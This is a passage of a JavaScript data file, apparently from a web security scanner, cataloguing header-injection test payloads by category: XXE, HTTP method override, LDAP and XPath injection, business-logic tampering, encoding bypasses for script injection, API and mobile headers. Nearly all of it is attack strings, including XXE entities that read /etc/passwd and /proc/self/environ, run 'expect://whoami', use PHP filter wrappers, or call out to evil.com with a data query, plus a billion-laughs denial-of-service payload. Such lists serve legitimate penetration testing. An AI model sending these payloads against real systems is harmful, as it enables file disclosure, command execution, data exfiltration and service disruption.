                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/?data=SYSTEM">%xxe;]>',
                severity: "high"
            },
            {
                name: "UTF-16 XXE",
                description: "UTF-16 encoded XXE",
                payload: "Content-Type: application/xml; charset=UTF-16",
                severity: "medium"
            },
            {
                name: "UTF-7 XXE",
                description: "UTF-7 encoded XXE",
                payload: "Content-Type: application/xml; charset=UTF-7",
                severity: "medium"
            },
            {
                name: "JSON to XML XXE",
                description: "JSON to XML conversion XXE",
                payload: "Content-Type: application/json\\r\\nX-Convert-To: xml",
                severity: "medium"
            },
            {
                name: "GraphQL XXE",
                description: "XXE in GraphQL",
                payload: "Content-Type: application/graphql\\r\\nX-Output-Format: xml",
                severity: "medium"
            },
            {
                name: "PDF XXE",
                description: "XXE in PDF processing",
                payload: "Content-Type: application/pdf\\r\\nX-Extract-Format: xml",
                severity: "medium"
            },
            {
                name: "ZIP XXE",
                description: "XXE in ZIP file processing",
                payload: "Content-Type: application/zip\\r\\nX-Extract-Content: true",
                severity: "medium"
            },
            {
                name: "OOXML XXE",
                description: "XXE in Office Open XML",
                payload: "Content-Type: application/vnd.ms-excel",
                severity: "high"
            },
            {
                name: "XInclude XXE",
                description: "XInclude based XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>',
                severity: "high"
            },
            {
                name: "SYSTEM Entity",
                description: "SYSTEM entity expansion",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://whoami">]><root>&xxe;</root>',
                severity: "critical"
            },
            {
                name: "PUBLIC Entity",
                description: "PUBLIC entity XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe PUBLIC "foo" "file:///etc/passwd">]><root>&xxe;</root>',
                severity: "high"
            },
            {
                name: "Recursive Entity",
                description: "Billion laughs attack",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
                severity: "medium"
            },
            {
                name: "External Entity",
                description: "External entity reference",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/data.xml">]><root>&xxe;</root>',
                severity: "high"
            },
            {
                name: "File Protocol XXE",
                description: "File protocol XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
                severity: "critical"
            },
            {
                name: "PHP Protocol XXE",
                description: "PHP wrapper XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
                severity: "critical"
            },
            {
                name: "Jar Protocol XXE",
                description: "Jar protocol XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "jar:file:///tmp/file.zip!/file.txt">]><root>&xxe;</root>',
                severity: "medium"
            },
            {
                name: "Data Protocol XXE",
                description: "Data URI XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "data://text/plain;base64,ZXZpbA==">]><root>&xxe;</root>',
                severity: "medium"
            },
            {
                name: "Gopher Protocol XXE",
                description: "Gopher protocol XXE",
                payload: 'Content-Type: application/xml\\r\\n\\r\\n<!DOCTYPE root [<!ENTITY xxe SYSTEM "gopher://localhost:70">]><root>&xxe;</root>',
                severity: "medium"
            }
        ]
    },
    "Protocol Attacks": {
        icon: "fa-exchange-alt",
        tests: [
            {
                name: "HTTP/0.9 Downgrade",
                description: "Force HTTP/0.9",
                payload: "X-Test: value\\r\\n\\r\\nGET /admin",
                severity: "medium"
            },
            {
                name: "Method Override",
                description: "HTTP method override",
                payload: "X-HTTP-Method-Override: DELETE",
                severity: "high"
            },
            {
                name: "X-Method-Override",
                description: "Alternative method override",
                payload: "X-Method-Override: PUT",
                severity: "high"
            },
            {
                name: "WebDAV Methods",
                description: "WebDAV method testing",
                payload: "X-HTTP-Method: PROPFIND",
                severity: "medium"
            },
            {
                name: "TRACE Method",
                description: "TRACE method XST",
                payload: "X-HTTP-Method-Override: TRACE",
                severity: "medium"
            },
            {
                name: "CONNECT Method",
                description: "CONNECT tunneling",
                payload: "X-HTTP-Method-Override: CONNECT",
                severity: "high"
            },
            {
                name: "Custom Method",
                description: "Custom HTTP method",
                payload: "X-HTTP-Method: HACK",
                severity: "low"
            },
            {
                name: "HEAD to GET",
                description: "HEAD to GET conversion",
                payload: "X-HTTP-Method-Override: GET\\r\\nX-Original-Method: HEAD",
                severity: "medium"
            },
            {
                name: "OPTIONS Override",
                description: "OPTIONS method override",
                payload: "X-HTTP-Method-Override: OPTIONS",
                severity: "low"
            },
            {
                name: "PATCH Method",
                description: "PATCH method override",
                payload: "X-HTTP-Method-Override: PATCH",
                severity: "medium"
            },
            {
                name: "LINK Method",
                description: "LINK method testing",
                payload: "X-HTTP-Method: LINK",
                severity: "low"
            },
            {
                name: "UNLINK Method",
                description: "UNLINK method testing",
                payload: "X-HTTP-Method: UNLINK",
                severity: "low"
            },
            {
                name: "PURGE Method",
                description: "Cache PURGE method",
                payload: "X-HTTP-Method-Override: PURGE",
                severity: "medium"
            },
            {
                name: "LOCK Method",
                description: "WebDAV LOCK method",
                payload: "X-HTTP-Method: LOCK",
                severity: "medium"
            },
            {
                name: "UNLOCK Method",
                description: "WebDAV UNLOCK method",
                payload: "X-HTTP-Method: UNLOCK",
                severity: "medium"
            },
            {
                name: "MKCOL Method",
                description: "WebDAV MKCOL method",
                payload: "X-HTTP-Method: MKCOL",
                severity: "medium"
            },
            {
                name: "COPY Method",
                description: "WebDAV COPY method",
                payload: "X-HTTP-Method: COPY",
                severity: "medium"
            },
            {
                name: "MOVE Method",
                description: "WebDAV MOVE method",
                payload: "X-HTTP-Method: MOVE",
                severity: "medium"
            },
            {
                name: "SEARCH Method",
                description: "WebDAV SEARCH method",
                payload: "X-HTTP-Method: SEARCH",
                severity: "medium"
            },
            {
                name: "SUBSCRIBE Method",
                description: "Event subscription method",
                payload: "X-HTTP-Method: SUBSCRIBE",
                severity: "low"
            },
            {
                name: "UNSUBSCRIBE Method",
                description: "Event unsubscription method",
                payload: "X-HTTP-Method: UNSUBSCRIBE",
                severity: "low"
            },
            {
                name: "NOTIFY Method",
                description: "Event notification method",
                payload: "X-HTTP-Method: NOTIFY",
                severity: "low"
            },
            {
                name: "BPROPFIND Method",
                description: "Batch PROPFIND",
                payload: "X-HTTP-Method: BPROPFIND",
                severity: "low"
            },
            {
                name: "BPROPPATCH Method",
                description: "Batch PROPPATCH",
                payload: "X-HTTP-Method: BPROPPATCH",
                severity: "low"
            },
            {
                name: "POLL Method",
                description: "POLL method testing",
                payload: "X-HTTP-Method: POLL",
                severity: "low"
            },
            {
                name: "BMOVE Method",
                description: "Batch MOVE",
                payload: "X-HTTP-Method: BMOVE",
                severity: "low"
            },
            {
                name: "BCOPY Method",
                description: "Batch COPY",
                payload: "X-HTTP-Method: BCOPY",
                severity: "low"
            },
            {
                name: "BDELETE Method",
                description: "Batch DELETE",
                payload: "X-HTTP-Method: BDELETE",
                severity: "medium"
            },
            {
                name: "PROPPATCH Method",
                description: "WebDAV PROPPATCH",
                payload: "X-HTTP-Method: PROPPATCH",
                severity: "medium"
            },
            {
                name: "ACL Method",
                description: "Access Control List method",
                payload: "X-HTTP-Method: ACL",
                severity: "medium"
            }
        ]
    },
    "LDAP Injection": {
        icon: "fa-sitemap",
        tests: [
            {
                name: "Basic LDAP Injection",
                description: "Simple LDAP injection",
                payload: "X-Username: admin)(&(password=*",
                severity: "high"
            },
            {
                name: "LDAP OR Injection",
                description: "LDAP OR condition bypass",
                payload: "X-Username: admin)(|(password=*",
                severity: "high"
            },
            {
                name: "LDAP AND Injection",
                description: "LDAP AND condition manipulation",
                payload: "X-Username: *)(uid=*))(|(uid=*",
                severity: "high"
            },
            {
                name: "LDAP Wildcard",
                description: "LDAP wildcard injection",
                payload: "X-Username: *",
                severity: "medium"
            },
            {
                name: "LDAP Null Byte",
                description: "Null byte LDAP injection",
                payload: "X-Username: admin\\x00",
                severity: "high"
            },
            {
                name: "LDAP Comment",
                description: "LDAP comment injection",
                payload: "X-Username: admin)#",
                severity: "medium"
            },
            {
                name: "LDAP Attribute Injection",
                description: "Attribute manipulation",
                payload: "X-Filter: (cn=*)(userPassword=*)",
                severity: "high"
            },
            {
                name: "LDAP DN Injection",
                description: "Distinguished Name injection",
                payload: "X-DN: cn=admin,dc=example,dc=com)(&(objectClass=*",
                severity: "high"
            },
            {
                name: "LDAP Filter Bypass",
                description: "Filter bypass injection",
                payload: "X-Filter: (&(uid=admin)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))",
                severity: "high"
            },
            {
                name: "LDAP Escape Sequence",
                description: "Escape sequence injection",
                payload: "X-Username: admin\\29\\28&\\28password=\\2a",
                severity: "high"
            },
            {
                name: "LDAP Boolean Blind",
                description: "Boolean-based blind LDAP",
                payload: "X-Username: admin)(cn=a*",
                severity: "high"
            },
            {
                name: "LDAP Time-Based",
                description: "Time-based LDAP injection",
                payload: "X-Username: admin)(|(userPassword=A*",
                severity: "high"
            },
            {
                name: "LDAP Search Injection",
                description: "Search scope manipulation",
                payload: "X-Search-Base: dc=example,dc=com)(&(objectClass=*",
                severity: "high"
            },
            {
                name: "LDAP Group Injection",
                description: "Group membership bypass",
                payload: "X-Username: admin)(memberOf=cn=administrators*",
                severity: "high"
            },
            {
                name: "LDAP Schema Injection",
                description: "Schema discovery",
                payload: "X-Filter: (objectClass=*)",
                severity: "medium"
            },
            {
                name: "LDAP Hex Encoding",
                description: "Hex encoded LDAP injection",
                payload: "X-Username: \\61\\64\\6d\\69\\6e\\29\\28\\26",
                severity: "high"
            },
            {
                name: "LDAP Unicode",
                description: "Unicode LDAP injection",
                payload: "X-Username: admin",
                severity: "medium"
            },
            {
                name: "LDAP Case Variation",
                description: "Case sensitivity bypass",
                payload: "X-Username: AdMiN)(&(password=*",
                severity: "medium"
            },
            {
                name: "LDAP Nested Filter",
                description: "Nested filter injection",
                payload: "X-Filter: (&(|(cn=admin)(cn=root))(&(password=*)))",
                severity: "high"
            },
            {
                name: "LDAP NOT Operator",
                description: "NOT operator injection",
                payload: "X-Username: admin)(!(accountDisabled=TRUE)",
                severity: "high"
            },
            {
                name: "LDAP Approx Match",
                description: "Approximate match operator",
                payload: "X-Username: admin~",
                severity: "medium"
            },
            {
                name: "LDAP GTE Operator",
                description: "Greater than or equal",
                payload: "X-Filter: (uid>=admin)",
                severity: "medium"
            },
            {
                name: "LDAP LTE Operator",
                description: "Less than or equal",
                payload: "X-Filter: (uid<=admin)",
                severity: "medium"
            },
            {
                name: "LDAP Presence",
                description: "Attribute presence test",
                payload: "X-Filter: (userPassword=*)",
                severity: "high"
            },
            {
                name: "LDAP Substring",
                description: "Substring matching",
                payload: "X-Username: *adm*",
                severity: "medium"
            },
            {
                name: "LDAP Multi-valued",
                description: "Multi-valued attribute injection",
                payload: "X-Groups: admin)(cn=*",
                severity: "high"
            },
            {
                name: "LDAP Binary",
                description: "Binary attribute injection",
                payload: "X-Photo: \\FF\\D8\\FF\\E0)(cn=*",
                severity: "medium"
            },
            {
                name: "LDAP Referral",
                description: "LDAP referral injection",
                payload: "X-Referral: ldap://evil.com/",
                severity: "medium"
            },
            {
                name: "LDAP Control",
                description: "LDAP control injection",
                payload: "X-Control: 1.2.840.113556.1.4.319",
                severity: "medium"
            },
            {
                name: "LDAP Extended Op",
                description: "Extended operation injection",
                payload: "X-Extended-Op: 1.3.6.1.4.1.4203.1.11.3",
                severity: "medium"
            }
        ]
    },
    "XPath Injection": {
        icon: "fa-code",
        tests: [
            {
                name: "Basic XPath Injection",
                description: "Simple XPath injection",
                payload: "X-Username: admin' or '1'='1",
                severity: "high"
            },
            {
                name: "XPath Union",
                description: "XPath union injection",
                payload: "X-Query: ' | //users/password | '",
                severity: "high"
            },
            {
                name: "XPath Comment",
                description: "XPath comment injection",
                payload: "X-Username: admin' or 1=1 or 'a'='a",
                severity: "high"
            },
            {
                name: "XPath Boolean",
                description: "Boolean-based XPath",
                payload: "X-Username: admin' and '1'='1",
                severity: "high"
            },
            {
                name: "XPath Blind",
                description: "Blind XPath injection",
                payload: "X-Username: admin' and substring(//user[1]/password,1,1)='a",
                severity: "high"
            },
            {
                name: "XPath Functions",
                description: "XPath function abuse",
                payload: "X-Query: ' or count(//user)>0 or '",
                severity: "high"
            },
            {
                name: "XPath Axis",
                description: "XPath axis manipulation",
                payload: "X-Query: //user[position()=1]/child::*",
                severity: "high"
            },
            {
                name: "XPath Attribute",
                description: "Attribute selection",
                payload: "X-Query: //@* | //user[@role='admin']",
                severity: "high"
            },
            {
                name: "XPath Wildcard",
                description: "Wildcard selection",
                payload: "X-Query: //*[contains(text(),'admin')]",
                severity: "medium"
            },
            {
                name: "XPath String Functions",
                description: "String function injection",
                payload: "X-Username: ' or contains(name(),'user') or '",
                severity: "high"
            },
            {
                name: "XPath Numeric",
                description: "Numeric comparison",
                payload: "X-ID: 1 or position()=1",
                severity: "high"
            },
            {
                name: "XPath Node Test",
                description: "Node test injection",
                payload: "X-Query: //text() | //comment()",
                severity: "medium"
            },
            {
                name: "XPath Namespace",
                description: "Namespace manipulation",
                payload: "X-Query: //*[local-name()='user']",
                severity: "medium"
            },
            {
                name: "XPath Parent",
                description: "Parent traversal",
                payload: "X-Query: //password/parent::*",
                severity: "high"
            },
            {
                name: "XPath Sibling",
                description: "Sibling traversal",
                payload: "X-Query: //user/following-sibling::*",
                severity: "medium"
            },
            {
                name: "XPath Descendant",
                description: "Descendant selection",
                payload: "X-Query: //users/descendant::password",
                severity: "high"
            },
            {
                name: "XPath Ancestor",
                description: "Ancestor traversal",
                payload: "X-Query: //password/ancestor::users",
                severity: "medium"
            },
            {
                name: "XPath Double Slash",
                description: "Double slash injection",
                payload: "X-Query: // | //password",
                severity: "high"
            },
            {
                name: "XPath Bracket",
                description: "Bracket notation abuse",
                payload: "X-Query: //user[1][password='test']",
                severity: "high"
            },
            {
                name: "XPath Logic",
                description: "Logic operator injection",
                payload: "X-Username: ' or true() or '",
                severity: "high"
            },
            {
                name: "XPath Math",
                description: "Mathematical operations",
                payload: "X-ID: 1+1-1",
                severity: "medium"
            },
            {
                name: "XPath Comparison",
                description: "Comparison operators",
                payload: "X-Username: admin' or 'a'<'b",
                severity: "high"
            },
            {
                name: "XPath Last",
                description: "Last() function abuse",
                payload: "X-Query: //user[last()]",
                severity: "medium"
            },
            {
                name: "XPath Position",
                description: "Position() function abuse",
                payload: "X-Query: //user[position()>0]",
                severity: "medium"
            },
            {
                name: "XPath String Length",
                description: "String-length() abuse",
                payload: "X-Username: ' or string-length(//user[1]/password)>0 or '",
                severity: "high"
            },
            {
                name: "XPath Normalize",
                description: "Normalize-space() abuse",
                payload: "X-Username: ' or normalize-space(//user)='admin' or '",
                severity: "high"
            },
            {
                name: "XPath Translate",
                description: "Translate() function abuse",
                payload: "X-Username: ' or translate(//user,'abc','ABC')='ADMIN' or '",
                severity: "high"
            },
            {
                name: "XPath Concat",
                description: "Concat() function abuse",
                payload: "X-Username: ' or concat('ad','min')='admin' or '",
                severity: "high"
            },
            {
                name: "XPath Starts-With",
                description: "Starts-with() abuse",
                payload: "X-Username: ' or starts-with(//user,'ad') or '",
                severity: "high"
            },
            {
                name: "XPath Name",
                description: "Name() function abuse",
                payload: "X-Query: //*[name()='password']",
                severity: "high"
            }
        ]
    },
    "Business Logic": {
        icon: "fa-brain",
        tests: [
            {
                name: "Price Manipulation",
                description: "Negative price values",
                payload: "X-Price: -100",
                severity: "critical"
            },
            {
                name: "Quantity Overflow",
                description: "Integer overflow in quantity",
                payload: "X-Quantity: 999999999999999999999",
                severity: "high"
            },
            {
                name: "Race Condition",
                description: "Concurrent request marker",
                payload: "X-Request-ID: race-condition-test",
                severity: "high"
            },
            {
                name: "Workflow Bypass",
                description: "Skip workflow steps",
                payload: "X-Workflow-Step: final",
                severity: "high"
            },
            {
                name: "Discount Stacking",
                description: "Multiple discount codes",
                payload: "X-Discount-Code: SAVE50,SAVE25,SAVE10",
                severity: "high"
            },
            {
                name: "Currency Confusion",
                description: "Currency manipulation",
                payload: "X-Currency: ZWD",
                severity: "high"
            },
            {
                name: "Time Zone Exploit",
                description: "Time zone manipulation",
                payload: "X-Timezone: UTC-12",
                severity: "medium"
            },
            {
                name: "Rate Limit Bypass",
                description: "Rate limiting evasion",
                payload: "X-Forwarded-For: 10.0.0." + Math.random(),
                severity: "medium"
            },
            {
                name: "Account Type Elevation",
                description: "Account type manipulation",
                payload: "X-Account-Type: premium",
                severity: "high"
            },
            {
                name: "Transaction Replay",
                description: "Transaction ID reuse",
                payload: "X-Transaction-ID: previous-valid-transaction",
                severity: "high"
            },
            {
                name: "Referral Abuse",
                description: "Self-referral exploitation",
                payload: "X-Referrer-ID: self",
                severity: "medium"
            },
            {
                name: "Coupon Bypass",
                description: "Expired coupon reuse",
                payload: "X-Coupon-Override: true",
                severity: "medium"
            },
            {
                name: "Inventory Manipulation",
                description: "Stock level tampering",
                payload: "X-Stock-Override: 9999",
                severity: "high"
            },
            {
                name: "Shipping Bypass",
                description: "Free shipping exploit",
                payload: "X-Shipping-Method: free_exploit",
                severity: "medium"
            },
            {
                name: "Tax Evasion",
                description: "Tax calculation bypass",
                payload: "X-Tax-Exempt: true",
                severity: "high"
            },
            {
                name: "Loyalty Points",
                description: "Points manipulation",
                payload: "X-Loyalty-Points: 999999",
                severity: "medium"
            },
            {
                name: "Gift Card Exploit",
                description: "Gift card balance manipulation",
                payload: "X-Gift-Card-Balance: 10000",
                severity: "high"
            },
            {
                name: "Subscription Bypass",
                description: "Premium features access",
                payload: "X-Subscription-Level: enterprise",
                severity: "high"
            },
            {
                name: "A/B Test Manipulation",
                description: "Force favorable A/B test group",
                payload: "X-AB-Test-Group: discount_group",
                severity: "low"
            },
            {
                name: "Geolocation Spoofing",
                description: "Location-based pricing bypass",
                payload: "X-Geo-Location: 0.0000,0.0000",
                severity: "medium"
            },
            {
                name: "Language Pricing",
                description: "Language-based pricing exploit",
                payload: "X-Language: hi-IN",
                severity: "medium"
            },
            {
                name: "Partner API Abuse",
                description: "Partner privileges escalation",
                payload: "X-Partner-ID: internal",
                severity: "high"
            },
            {
                name: "Batch Size Limit",
                description: "Batch processing limit bypass",
                payload: "X-Batch-Size: 10000",
                severity: "medium"
            },
            {
                name: "Export Limit Bypass",
                description: "Data export restrictions bypass",
                payload: "X-Export-Limit: unlimited",
                severity: "medium"
            },
            {
                name: "Trial Extension",
                description: "Trial period manipulation",
                payload: "X-Trial-Days: 9999",
                severity: "medium"
            },
            {
                name: "Feature Flag Override",
                description: "Hidden feature activation",
                payload: "X-Feature-Flags: experimental_features",
                severity: "medium"
            },
            {
                name: "Credit Limit Bypass",
                description: "Credit limit manipulation",
                payload: "X-Credit-Limit: 999999",
                severity: "high"
            },
            {
                name: "Approval Bypass",
                description: "Approval workflow skip",
                payload: "X-Approved-By: system",
                severity: "high"
            },
            {
                name: "Priority Queue Jump",
                description: "Queue priority manipulation",
                payload: "X-Priority: 999",
                severity: "medium"
            },
            {
                name: "Resource Quota",
                description: "Resource limit bypass",
                payload: "X-Resource-Quota: unlimited",
                severity: "medium"
            }
        ]
    },
    "Encoding Bypass": {
        icon: "fa-lock-open",
        tests: [
            {
                name: "URL Encoding",
                description: "Basic URL encoding",
                payload: "X-Test: %3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                severity: "medium"
            },
            {
                name: "Double URL Encoding",
                description: "Double URL encoding",
                payload: "X-Test: %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
                severity: "medium"
            },
            {
                name: "Unicode Encoding",
                description: "Unicode character encoding",
                payload: "X-Test: \\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E",
                severity: "medium"
            },
            {
                name: "UTF-7 Encoding",
                description: "UTF-7 encoding bypass",
                payload: "X-Test: +ADw-script+AD4-alert(1)+ADw-/script+AD4-",
                severity: "medium"
            },
            {
                name: "UTF-16 Encoding",
                description: "UTF-16 encoding bypass",
                payload: "Content-Type: text/html; charset=UTF-16",
                severity: "medium"
            },
            {
                name: "UTF-32 Encoding",
                description: "UTF-32 encoding bypass",
                payload: "Content-Type: text/html; charset=UTF-32",
                severity: "medium"
            },
            {
                name: "HTML Entity Encoding",
                description: "HTML entity encoding",
                payload: "X-Test: &lt;script&gt;alert(1)&lt;/ script&gt;",
                severity: "low"
            },
            {
                name: "HTML Decimal Entities",
                description: "HTML decimal entities",
                payload: "X-Test: &#60;script&#62;alert(1)&#60;/ script&#62;",
                severity: "low"
            },
            {
                name: "HTML Hex Entities",
                description: "HTML hexadecimal entities",
                payload: "X-Test: &#x3C;script&#x3E;alert(1)&#x3C;/ script&#x3E;",
                severity: "low"
            },
            {
                name: "Base64 Encoding",
                description: "Base64 encoded payload",
                payload: "X-Test: " + btoa("<script>alert(1)< /script>"),
                severity: "medium"
            },
            {
                name: "Base32 Encoding",
                description: "Base32 encoded payload",
                payload: "X-Test: JVQW4YLMFQQGCYLOMRSXE5DJMZTS6MRQGE4V6MRRMIZTINJWGU======",
                severity: "medium"
            },
            {
                name: "Hex Encoding",
                description: "Hexadecimal encoding",
                payload: "X-Test: 3c7363726970743e616c6572742831293c2f7363726970743e",
                severity: "medium"
            },
            {
                name: "Octal Encoding",
                description: "Octal encoding",
                payload: "X-Test: \\074\\163\\143\\162\\151\\160\\164\\076",
                severity: "medium"
            },
            {
                name: "Mixed Encoding",
                description: "Mixed encoding types",
                payload: "X-Test: %3C\\u0073cript>alert\\x28\\x31\\x29< /script>",
                severity: "high"
            },
            {
                name: "Case Variation",
                description: "Case sensitivity bypass",
                payload: "X-Test: <ScRiPt>AlErT(1)< /sCrIpT>",
                severity: "low"
            },
            {
                name: "Overlong UTF-8",
                description: "Overlong UTF-8 sequences",
                payload: "X-Test: \\xC0\\xBC\\x73\\x63\\x72\\x69\\x70\\x74\\xC0\\xBE",
                severity: "medium"
            },
            {
                name: "BOM Injection",
                description: "Byte Order Mark injection",
                payload: "X-Test: \\xEF\\xBB\\xBF<script>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "Punycode Encoding",
                description: "Punycode domain encoding",
                payload: "X-Host: xn--n3h.com",
                severity: "medium"
            },
            {
                name: "ROT13 Encoding",
                description: "ROT13 simple encoding",
                payload: "X-Test: <fpevcg>nyreg(1)</fpevcg>",
                severity: "low"
            },
            {
                name: "Morse Code",
                description: "Morse code encoding",
                payload: "X-Test: ... -.-. .-. .. .--. -",
                severity: "low"
            },
            {
                name: "Binary Encoding",
                description: "Binary representation",
                payload: "X-Test: 01110011 01100011 01110010 01101001 01110000 01110100",
                severity: "low"
            },
            {
                name: "Decimal NCR",
                description: "Decimal NCR encoding",
                payload: "X-Test: &#115;&#99;&#114;&#105;&#112;&#116;",
                severity: "low"
            },
            {
                name: "CDATA Bypass",
                description: "CDATA section bypass",
                payload: "X-Test: <![CDATA[<script>alert(1)< /script>]]>",
                severity: "medium"
            },
            {
                name: "Comments Bypass",
                description: "Comment insertion bypass",
                payload: "X-Test: <scr<!--comment-->ipt>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "Null Byte Bypass",
                description: "Null byte encoding",
                payload: "X-Test: <script>alert(1)< /script>\\x00",
                severity: "high"
            },
            {
                name: "White Space Bypass",
                description: "Alternative whitespace chars",
                payload: "X-Test: <script\\x0A>alert(1)< script>",
                severity: "medium"
            },
            {
                name: "Zero Width Chars",
                description: "Zero width character insertion",
                payload: "X-Test: <scr\\u200Bipt>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "Right-to-Left Override",
                description: "RLO character abuse",
                payload: "X-Test: \\u202E<script>alert(1)< /script>",
                severity: "medium"
            },
            {
                name: "Homograph Attack",
                description: "Unicode homograph characters",
                payload: "X-Test: <rt>alert(1)< /rt>",
                severity: "medium"
            },
            {
                name: "Emoji Encoding",
                description: "Emoji character substitution",
                payload: "X-Test: scriptalert(1)/ script",
                severity: "low"
            }
        ]
    },
    "API Security": {
        icon: "fa-plug",
        tests: [
            {
                name: "API Version Confusion",
                description: "API version manipulation",
                payload: "X-API-Version: ../v0/admin",
                severity: "high"
            },
            {
                name: "GraphQL Introspection",
                description: "GraphQL schema disclosure",
                payload: "Content-Type: application/graphql\\r\\nX-Query: {__schema{types{name}}}",
                severity: "medium"
            },
            {
                name: "REST Method Tunneling",
                description: "HTTP method tunneling",
                payload: "X-HTTP-Method-Override: DELETE\\r\\nX-Original-Method: GET",
                severity: "high"
            },
            {
                name: "API Key Rotation",
                description: "API key validity bypass",
                payload: "X-API-Key: old-revoked-key\\r\\nX-API-Key-Version: legacy",
                severity: "high"
            },
            {
                name: "Rate Limit Header",
                description: "Rate limit bypass header",
                payload: "X-RateLimit-Bypass: internal",
                severity: "medium"
            },
            {
                name: "API Debug Mode",
                description: "Debug mode activation",
                payload: "X-API-Debug: true\\r\\nX-Debug-Token: 1234",
                severity: "high"
            },
            {
                name: "Content Negotiation",
                description: "Content type confusion",
                payload: "Accept: application/json\\r\\nContent-Type: application/xml",
                severity: "medium"
            },
            {
                name: "API Gateway Bypass",
                description: "Gateway routing bypass",
                payload: "X-Forwarded-Host: internal-api.local",
                severity: "high"
            },
            {
                name: "Batch API Abuse",
                description: "Batch endpoint exploitation",
                payload: "X-Batch-Request: [{\"method\":\"DELETE\",\"path\":\"/users/1\"}]",
                severity: "high"
            },
            {
                name: "API Deprecation",
                description: "Deprecated endpoint access",
                payload: "X-Use-Deprecated-API: true",
                severity: "medium"
            },
            {
                name: "WebSocket Upgrade",
                description: "Protocol upgrade manipulation",
                payload: "Upgrade: websocket\\r\\nX-WebSocket-Protocol: admin",
                severity: "medium"
            },
            {
                name: "gRPC Metadata",
                description: "gRPC metadata injection",
                payload: "X-GRPC-Metadata-Authorization: Bearer admin_token",
                severity: "high"
            },
            {
                name: "API Tenant Isolation",
                description: "Multi-tenant bypass",
                payload: "X-Tenant-ID: admin\\r\\nX-Tenant-Override: true",
                severity: "critical"
            },
            {
                name: "OpenAPI Validation",
                description: "Schema validation bypass",
                payload: "X-Skip-OpenAPI-Validation: true",
                severity: "medium"
            },
            {
                name: "API Correlation ID",
                description: "Correlation ID manipulation",
                payload: "X-Correlation-ID: ../../logs/admin",
                severity: "medium"
            },
            {
                name: "API Circuit Breaker",
                description: "Circuit breaker bypass",
                payload: "X-Circuit-Breaker-Override: open",
                severity: "medium"
            },
            {
                name: "API Response Format",
                description: "Response format manipulation",
                payload: "X-Response-Format: debug",
                severity: "medium"
            },
            {
                name: "API Sandbox Escape",
                description: "Sandbox environment escape",
                payload: "X-Environment: production\\r\\nX-Sandbox-Escape: true",
                severity: "high"
            },
            {
                name: "API Feature Toggle",
                description: "Feature flag manipulation",
                payload: "X-Feature-Flags: all_features_enabled",
                severity: "medium"
            },
            {
                name: "API Retry Policy",
                description: "Retry mechanism abuse",
                payload: "X-Retry-After: 0\\r\\nX-Max-Retries: 999",
                severity: "medium"
            },
            {
                name: "API Load Balancer",
                description: "Load balancer manipulation",
                payload: "X-LB-Target: internal-only-server",
                severity: "high"
            },
            {
                name: "API Timeout Bypass",
                description: "Timeout restriction bypass",
                payload: "X-Request-Timeout: 0",
                severity: "medium"
            },
            {
                name: "API Compression",
                description: "Compression bomb",
                payload: "Content-Encoding: gzip\\r\\nX-Decompression-Bomb: true",
                severity: "medium"
            },
            {
                name: "API Pagination Limit",
                description: "Pagination limit bypass",
                payload: "X-Page-Size: 999999",
                severity: "medium"
            },
            {
                name: "API Field Filtering",
                description: "Field filter bypass",
                payload: "X-Fields: *,password,secret,token",
                severity: "high"
            },
            {
                name: "API Query Depth",
                description: "GraphQL query depth attack",
                payload: "X-Query-Depth: 999",
                severity: "medium"
            },
            {
                name: "API Mutation Batch",
                description: "GraphQL mutation batching",
                payload: "X-Mutations: [{\"delete\":\"*\"}]",
                severity: "high"
            },
            {
                name: "API Subscription Abuse",
                description: "GraphQL subscription flooding",
                payload: "X-Subscription-Limit: unlimited",
                severity: "medium"
            },
            {
                name: "API Directive Injection",
                description: "GraphQL directive injection",
                payload: "X-Directives: @skip @include @deprecated",
                severity: "medium"
            },
            {
                name: "API Fragment Spread",
                description: "GraphQL fragment abuse",
                payload: "X-Fragment-Depth: 100",
                severity: "medium"
            }
        ]
    },
    "Mobile App Headers": {
        icon: "fa-mobile-alt",
        tests: [
            {
                name: "Device ID Spoofing",
                description: "Device identifier manipulation",
                payload: "X-Device-ID: root-device-000000",
                severity: "medium"
            },
            {
                name: "App Version Bypass",
                description: "App version check bypass",
                payload: "X-App-Version: 99.99.99",
                severity: "medium"
            },
            {
                name: "Platform Spoofing",
                description: "Platform identification spoof",
                payload: "X-Platform: iOS\\r\\nX-OS-Version: 15.0",
                severity: "low"
            },
            {
                name: "Jailbreak Detection",
                description: "Jailbreak detection bypass",
                payload: "X-Jailbroken: false\\r\\nX-Rooted: false",
                severity: "high"
            },
            {
                name: "Certificate Pinning",
                description: "Certificate pinning bypass",
                payload: "X-Cert-Pinning: disabled",
                severity: "high"
            },
            {
                name: "App Signature",
                description: "App signature verification bypass",
                payload: "X-App-Signature: valid-signature-bypass",
                severity: "high"
            },
            {
                name: "Push Token Manipulation",
                description: "Push notification token abuse",
